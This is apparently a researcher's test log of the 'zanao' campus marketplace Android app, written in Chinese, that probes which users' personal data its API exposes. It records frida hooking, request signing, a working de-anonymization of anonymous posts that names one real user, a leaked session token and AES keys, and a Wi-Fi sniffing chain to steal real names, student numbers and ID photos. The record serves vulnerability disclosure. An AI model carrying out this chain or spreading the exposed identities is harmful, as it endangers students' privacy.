# 校园集市 App — 他人 PII 可达性 · 实测记录

设备：Redmi K60 (23113RKC6C) / Android 14 / KernelSU root / 目标 `com.comingx.zanao` 3.1.0 (versionCode 310)
方式：frida spawn + 从 App 自身请求中取出会话 token + 调 `JniUtils.makeSign` 作为签名 oracle → 直接对
`http://api.app.zanao.com` 发请求（**全部为 http，明文**）。测试账号为本人微信登录账号（未做校园认证）。

---

## 0. 协议（实测校正，与原报告不同）

| 项 | 实测值 |
|---|---|
| API host | `http://api.app.zanao.com`（80 端口，**明文可用，服务端直接回 200/errno 0**） |
| 路径前缀 | **没有** `/sc-api`。`index.html` / `mx.html` 的 `CONST_PATH_NAME = ''` |
| 真实路径 | `/thread/v2/list`、`/user/usershow`、`/user/info`、`/user/certinfo`、`/app/checkuser` … |
| im 类 | `/im-api/chat/list`（`/msg/unum` 不带前缀会 `provider_unsupported`） |
| 签名输入 | `TreeMap{ timestamp__: X-Sc-Td, randnum__: X-Sc-Nd, ...req.data }` → `JniUtils.makeSign` |
| 签名输出 | 32 位大写十六进制，例：`1E5A1540D2A933506C41A75AFEF6FAAB` |
| 响应加密 | header `x-sc-encrypt: 1` → native 已自动解密（`unhashAppResult`） |

> 原报告里的 `/sc-api/...` 前缀是错的：按那个前缀发请求一律 `errno 3 sorry, illegal request`。

---

## 1. 他人头像 + 昵称 + 学校 + 账号年龄：✅ 已实测拿到

### 1.1 列表接口自带
```http
POST http://api.app.zanao.com/thread/v2/list
{"page":1,"per_page":10}
→ errno 0
data.list[i] = { thread_id, headimgurl, nickname, is_anon, cert_show, ... }
```
`headimgurl` 直接是完整 CDN 地址：
```
http://b1.cdn.zanao.com/upload/2026/08/24/mhphjy6vvhyvbrb.jpg@!sm_w100_h100
```

### 1.2 按帖子反查作者画像
```http
POST http://api.app.zanao.com/user/usershow
{"thread_id":"2185811440"}
→ errno 0
data.user_info = { nickname, headimgurl, school_name, user_exp, user_level,
                   user_level_title, reg_days }
```
实测样例（5 个不同帖子，均已返回数据）：

| thread_id | is_anon | 列表给的头像 | usershow 返回的昵称/头像 | school_name | reg_days |
|---|---|---|---|---|---|
| 2185811440 | false | upload/2026/08/24/mhphjy…jpg | x***x / 同图 | 中山大学 | 1179 |
| **2185810120** | **true** | **/anon/avatar/PRC7Fh…jpg** | **momoommomo / upload/2025/06/12/x5ab4e…jpg** | 中山大学 | 1162 |
| 2185810027 | false | upload/2026/07/25/hwnswu…jpg | …猫 / 同图 | 中山大学 | 866 |
| 2185808979 | false | upload/2026/08/27/wh2bcm…jpeg | …小魔… / 同图 | 中山大学 | 78 |
| 2185808328 | false | upload/2026/10/19/jwvmwv…jpeg | thechovy / 同图 | 中山大学 | 103 |

### 1.3 顺带发现：匿名帖被 /user/usershow 破了
`thread/v2/list` 对匿名帖返回 `is_anon: true` + 匿名头像 `/anon/avatar/...`；
但同一 `thread_id` 走 `POST /user/usershow` 直接返回**真实昵称 + 真实头像 URL**（上表第 2 行）。
匿名性没有在服务端闭环。

---

## 2. 他人姓名 / 学号：❌ 当前权限下拿不到（服务端鉴权到位）

逐个实测（均为普通账号 token）：

| 请求 | 结果 |
|---|---|
| `POST /thread/admin/userinfo {"uid":1}` | `errno 10 无操作权限` |
| `POST /thread/admin/userthread {"uid":1}` | `errno 10 无操作权限` |
| `POST /mx/admin/userinfo {"uid":1}` | `errno 10 无操作权限` |
| `POST /mx/user/usershow {"uid":1}` | `errno 10 参数非法`（uid 格式不对） |
| `POST /mx/user/usershow {"uid":"lmFtZpuUZ2uVlg=="}`（帖子里的 `sign`） | `errno 10 参数非法` |

**关键阻塞点：别人的 uid 在整个 API 响应里都不下发。** 帖子/评论/画像只给 `nickname`、`headimgurl`、`sign`（不可逆串），
没有 `uid` / `user_id`。所以连"传 uid 试越权"的入口都没有——除非拿到 uid。

### 2.1 uid 到底能不能拿（逐个实测）

| 接口 | 结果 |
|---|---|
| `POST /user/v1/profile`（空 data） | ✅ **返回自己的** `user_info.user_id=2183869210`、`id=13492465`、`community_id=10048`、`cert_status=0` |
| `POST /user/v1/profile {"user_id":"<别人>"}` | ⚠️ `errno 0`，但返回的**还是自己**（`user_id` 仍为 2183869210）→ 参数被忽略，严格自作用域，无 IDOR |
| `POST /mx/user/usershow {"uid":"2183869210"}`（自己的真实 user_id） | `errno 10 参数非法` |
| `POST /mx/user/usershow {"uid":"13492465"}`（自己的 id） | `errno 10 参数非法` |
| `POST /mx/user/usershow {"uid":…±1}` | `errno 10 参数非法` |
| `POST /mx/admin/userinfo {"uid":"<自己的 user_id>"}` | `errno 10 无操作权限`（鉴权在 uid 校验之前） |
| `POST /thread/likelist`、`/thread/mark/list`、`/msg/list`、`/im-api/chat/list`、`/user/mineinfo`、`/user/simpleinfo`、`/thread/stat`、`/view/hotlist` | 全部 `errno 0`，**没有任何 `uid/user_id` 字段**（本人账号的这几个列表为空，结构里只有 `nickname`/`headimgurl`） |

结论：
- **自己的 uid 拿得到**（`/user/v1/profile`）。
- **别人的 uid 拿不到**：所有面向他人的响应只有 `nickname`、`headimgurl`、以及不可逆的 `sign`。
- `/mx/user/usershow` 期望的 `uid` 不是 `user_id` 也不是 `id`（两者都被判"参数非法"），是 mx 圈内的另一套标识。

### 2.2 校园认证是不是前置条件| 目标 | 是否需要本机账号已认证 |
|---|---|
| 拿他人头像 / 昵称 / 学校 / 注册天数 | **不需要**。本次测试账号 `cert_status=0`（未认证），5 个用户的数据全部拿到 |
| 拿他人姓名 / 学号 | **认证也没用**。`admin/*` 是按角色鉴权（用自己 uid 同样"无操作权限"），认证不会让任何响应多出别人的实名 |
| 自测"劫持后能读实名"这一跳 | **需要**：受害者（或你自己的号认证后）`cert_info` 里才会有 `realname/student_no/cert_img`；未认证时只有 `{school_name, school_id}` |

`/user/info`（本人）返回的 `user_info` 同样没有 uid 字段。

`/user/certinfo` 实测（本人、未认证）：
```http
GET http://api.app.zanao.com/user/certinfo?school_id=DxB7
→ errno 0
data.cert_info = { school_name:"…中山学院", school_id:1320 }   // 无 realname/student_no
```
即：`cert_info` 只会带**本人**的认证字段；未认证时只有学校信息。
`errno 10 对不起，该学校暂未开通认证` 是 school_id 无效，不是越权拦截。

---

## 3. 唯一能拿到"他人姓名+学号+学生证照"的路径：会话劫持

已实测确认的两条硬前提：

1. **全程明文**：`http://api.app.zanao.com` 返回 200/errno 0，Manifest `usesCleartextTraffic=true` +
   `network_config` 的 `base-config cleartextTrafficPermitted=true`。
2. **token 就写在明文请求头里**：`X-Sc-Token: UjBQL2ltM2xaeEhpc0VNZGdlQnJMOUZOdUt1cDRkNVR1dmhWd1h4TjI1dz0=`
   （本机从 App 自身请求中直接取出，未做任何解密）。

链路：
```
同 WiFi/热点嗅探 → 抓到 X-Sc-Token
→ GET http://api.app.zanao.com/user/certinfo?school_id=<受害者学校id>
   Header: X-Sc-Token: <受害者token>
→ cert_info.{ realname, student_no, cert_img, cert_img_url, college_text, degree_text, join_year }
→ cert_img_url 直接就是学生证照片地址（H5: certShowUrl 优先用 cert_img_url）
```

注意：受害者必须是**已完成校园认证**的账号，否则 cert_info 只有学校字段（见 §2）。
本机测试账号未认证，故该链路的最后一跳无法用本人账号验证。

---

## 4. 工具（已跑通）

| 文件 | 说明 |
|---|---|
| `tools/zanao_oracle.js` | 暴露 `makeSign` / `unhashAppResult` 为 RPC（frida CLI 下可用） |
| `tools/probe11.js` | 本记录 §1 的证据采集脚本（列表 → usershow → certinfo） |
| `tools/probe12.js` | §2 的 admin 鉴权探测 |
| `tools/probe13.js` | 学校列表 + certinfo 结构 |
| `tools/probe4.js` ~ `probe10.js` | 逐步定位过程（路径前缀、签名取值类型、uid 来源） |
| `tools/dbg.js` / `sniff2.js` | 观察 App 自身请求与响应（`CompleterCallback`） |

运行方式（frida CLI，Java bridge 只在 CLI 下可用）：
```bash
adb forward tcp:39999 tcp:39999
frida -H 127.0.0.1:39999 -f com.comingx.zanao -l tools/probe11.js
```

---

## 5. 给开发者的结论

1. **明文中转会话令牌**（P0）：服务端确实接受 80 端口，不只是客户端写错。
2. **匿名帖可被 `/user/usershow` 去匿名**（新，建议 P1）：response 里应只回匿名态。
3. **admin 接口鉴权有效**（正面）：`/thread/admin/*`、`/mx/admin/*` 对普通账号统一 `errno 10 无操作权限`。
4. **uid 未下发**（正面）：这是当前挡住"按 uid 拉实名"的关键设计，应保持。
5. 风险点仍在：一旦某用户 token 泄露（明文链路），其 `realname/student_no/学生证照` 即可被本人接口读走。

### 2.3 `/user/certinfo` 追加 uid 是否越权（有效 school_id 下实测）

| 请求 | errno | 返回的 cert_info |
|---|---|---|
| `?school_id=DxB7` | 0 | `{school_name, school_id:1320}` |
| `?school_id=DxB7&uid=<自己 user_id>` | 0 | **同上，逐字节一致** |
| `?school_id=DxB7&user_id=<自己 user_id>` | 0 | 同上 |
| `?school_id=DxB7&id=<自己 id>` | 0 | 同上 |
| `?school_id=DxB7&uid=<别人 user_id +1>` | 0 | **同上** |

判断：服务端**不按参数切换查询主体**，cert_info 完全由 token 决定；该接口不存在 by-id 查询形态。
（本账号未认证时 cert_info 只有 school 字段，所以"认证后会不会多字段"这一项仍须用认证号复测，
但主体选择逻辑与认证状态无关——认证只影响"自己那份有没有内容"。）
---

## 6. 补充：不劫持他人账号时，别人能拿到多少（probe20/21/22）

### 6.1 参数名修正（此前 errno 10 的真正原因）

| 接口 | 正确参数 |
|---|---|
| `/thread/info` | **`{id: thread_id}`**（不是 `thread_id`） |
| `/comment/list` | **`{id: thread_id, page}`** |
| `/mx/thread/info` | `{id: thread_id}` |
| `/im-api/chat/prepare` | `{sign: <帖子列表里的 sign>}` |

### 6.2 别人的 uid：只下发"密文标识"，不下发明文

| 来源 | 字段 | 形态 |
|---|---|---|
| `POST /thread/info {id}` | `data.detail.user_id` | 88–108 字符 base64（**密文/不透明标识**） |
| `POST /comment/list {id}` | `data.list[].uid` | 同样形态 |
| 匿名帖（`is_anon:true`） | — | **不返回** user_id |

实测：`/thread/info` 扫 10 条帖子，6 条非匿名帖返回 `user_id`，4 条匿名帖没有。

解不出来：
- `JniUtils.unhash(blob)` / `unhashAppResult(blob)` → 返回空串
- `JniUtils.hash(blob)` → 返回另一个 base64（说明 hash 是正向单程，不是这条的逆）
- 用 H5 里硬编码的 AES 参数（`KEY=hIWanaS4k5iji5WqZmypng==` / `IV=g4KSn6S4mpi6fJ6XaWmqlw==`，
  经 `customDecrypt(…, "68bfccbfb8ef27ff31dc75f05490c85c")` 派生为
  `NM87AU12AS0D45C8` / `MJ09AU82XD9172D1`）离线解，**解不出来**（双层 base64 解完不是合法 AES 块长度）
- 结论：这更像是服务端可识别的**不透明标识**，客户端从不解析它，只是原样回传给特定接口

把该密文直接喂给业务接口也不通：`/mx/user/usershow` → `参数非法`；`/mx/admin/userinfo` → `无操作权限`。

### 6.3 认证信息：非劫持场景确认拿不到

| 接口 | 用他人 uid 密文 | 用自己 uid | 结论 |
|---|---|---|---|
| `/mx/admin/userinfo` | `10 无操作权限` | `10 无操作权限` | 角色鉴权 |
| `/thread/admin/userinfo` | — | `10 无操作权限` | 角色鉴权 |
| `/thread/admin/userthread` | — | `10 无操作权限` | 角色鉴权 |
| `/user/certinfo` | 参数被忽略 | 只回自己 | token 定位主体 |

### 6.4 不劫持时能拿到的"他人信息"清单

| 字段 | 来源 |
|---|---|
| 昵称 / 头像 URL / 学校 / 注册天数 / 等级 / 等级称号 | `user/usershow {thread_id}`、`thread/v2/list` |
| 匿名帖的**真实**昵称与头像 | `user/usershow {thread_id}`（匿名失效，见 §1.3） |
| 用户自填联系方式（如 `contact_qq` / `contact_phone`） | `thread/info {id}` 的 `detail`，本次扫 10 条命中 1 条 |
| uid 密文标识 | `thread/info`、`comment/list`（不可解） |
| 姓名 / 学号 / 学生证照 | **拿不到**（需劫持，见 §3） |
---

## 7. 写类 admin 接口鉴权实测（21 条，目标全部不存在）

原则：只用**不存在**的 `id`/`uid`（thread id=1、uid=0/1/999999999999）。
若鉴权缺失，最坏结果是"对象不存在"，不会删到别人的帖子、封到别人的号。

| 接口 | 结果 |
|---|---|
| `/thread/admin/delete` `/top` `/check` `/hotchange` `/showchange` `/paychange` `/risklevelset` `/comstatuschange` `/auditremarkset` `/imgchange` `/revert` `/commentchange` | 12/12 `errno 10 无操作权限` |
| `/mx/admin/delete` `/check` `/top` `/likechange` `/commentchange` `/paylevelset` | 6/6 `errno 10 无操作权限` |
| `/mx/admin/userforbid` `/userreset` `/risklevelset` `/thread/admin/userforbid` | `uid=1` 与 12 位 uid → `errno 10 uid非法`（**uid 校验先于角色校验**）；`uid=0` → `errno 10 无操作权限`（角色校验同样存在） |

结论：**21/21 全部被拒**，普通账号（未认证）无法执行任何管理写操作。
`is_admin` 只由服务端在 `/thread/info`、`/mx/thread/info` 的响应里下发，客户端无法伪造。